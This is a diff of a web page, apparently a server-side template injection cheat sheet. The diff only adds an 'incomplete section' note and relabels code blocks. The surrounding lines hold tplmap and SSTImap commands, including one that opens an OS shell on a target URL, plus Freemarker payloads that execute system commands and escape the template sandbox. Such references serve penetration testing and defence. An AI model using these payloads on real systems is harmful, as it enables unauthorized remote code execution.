@@ -6,6 +6,8 @@ include_toc = 'true'
 +++
 # Server-Side Template Injections
 
+## Note that Hugo still has some difficulty handling certain strings in certain manners here and it's under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware
+
 > Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
 
 ## Tools
@@ -16,7 +18,7 @@ Recommended tools:
 
 e.g:
 
-```powershell
+```bash
 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
@@ -26,7 +28,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 e.g:
 
-```powershell
+```bash
 python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
 python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
 python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
@@ -148,7 +150,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 
 :warning: only works on Freemarker versions below 2.3.30
 
-```js
+```javascript
 <#assign classloader=article.class.protectionDomain.classLoader>
 <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
 <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
